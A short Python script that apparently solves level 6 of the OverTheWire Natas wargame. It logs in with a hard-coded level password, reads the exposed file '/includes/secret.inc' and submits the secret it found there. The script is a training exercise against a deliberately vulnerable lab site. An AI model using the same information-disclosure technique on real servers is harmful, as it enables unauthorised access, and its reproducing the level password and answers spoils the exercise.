import requests
import re

url= "http://natas6.natas.labs.overthewire.org"

s= requests.Session()
s.auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
r= s.get(url+'/includes/secret.inc')
r= s.post(url,params={
    'secret':'FOEIUWGHFEEUHOFUOIU',
    'submit':'Submit'
}
)
print(r.text)